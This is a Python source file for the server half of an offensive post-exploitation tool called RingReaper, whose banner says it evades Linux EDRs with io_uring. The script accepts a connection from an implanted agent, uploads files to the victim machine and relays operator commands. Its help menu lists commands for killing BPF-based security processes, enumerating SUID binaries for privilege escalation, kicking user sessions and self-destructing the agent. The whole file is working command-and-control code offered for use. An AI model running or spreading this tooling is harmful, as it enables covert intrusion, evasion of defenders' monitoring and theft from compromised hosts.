import socket
import argparse
import sys
import os

BANNER = r"""


██████╗ ██╗███╗   ██╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
██████╔╝██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██╗██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██║██║ ╚████║╚██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                              

   	          --- EVADING LINUX EDRS WITH IO_URING ---

"""

def help():
    return '''
Available commands:
  get <path>                   - See file
  put <local_path> <remote_path> - Upload file
  killbpf                     - Kill processes that have bpf-map and delete /sys/fs/bpf/*
  users                       - View logged users
  ss/netstat                  - View connections
  ps                          - List processes
  me                          - Show agent PID and TTY
  kick <pts>                  - Kill session by pts
  privesc                     - Enumerate SUID binaries
  selfdestruct                - Delete agent and exit
  exit                        - Close connection (without deleting the agent)
  help                        - This help
'''

def main():
    parser = argparse.ArgumentParser(description="RingReaper server")
    parser.add_argument("--ip", help="IP address to listen on")
    parser.add_argument("--port", type=int, help="Port to listen on")
    args = parser.parse_args()

    print(BANNER)

    if args.ip is None or args.port is None:
        parser.print_help()
        sys.exit(0)

    host = args.ip
    port = args.port

    print(f"[+] Starting server on {host}:{port}...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print("[+] Waiting for connection...")
        conn, addr = s.accept()
        with conn:
            print(f"[+] Connected by {addr}")

            try:
                while True:
                    cmd = input("root@nsa:~#  ").strip()
                    if not cmd:
                        continue
                        
                    if cmd.startswith("help"):
                         print(help())

                    elif cmd.startswith("put "):
                        parts = cmd.split()
                        if len(parts) != 3:
                            print("[!] Usage: put <local_path> <remote_path>")
                            continue
                        local_path, remote_path = parts[1], parts[2]

                        try:
                            size = os.path.getsize(local_path)
                        except Exception as e:
                            print(f"[!] Failed to stat local file: {e}")
                            continue

                        conn.sendall(f"recv {remote_path} {size}\n".encode())
                        print(f"[+] Sent 'recv {remote_path} {size}' to agent")

                        try:
                            with open(local_path, "rb") as f:
                                while True:
                                    chunk = f.read(4096)
                                    if not chunk:
                                        break
                                    conn.sendall(chunk)
                            print(f"[+] File {local_path} sent to agent successfully")
                        except Exception as e:
                            print(f"[!] Failed to open local file: {e}")
                        continue
                        
                    else:
                        conn.sendall(cmd.encode() + b"\n")

                        data = b""
                        while True:
                            chunk = conn.recv(4096)
                            if not chunk:
                                print("[!] Connection closed by client")
                                return
                            data += chunk
                            if len(chunk) < 4096:
                                break

                        print("[+] Output:\n")
                        print(data.decode(errors="ignore"))

            except KeyboardInterrupt:
                print("\n[-] Server shutting down.")

if __name__ == "__main__":
    main()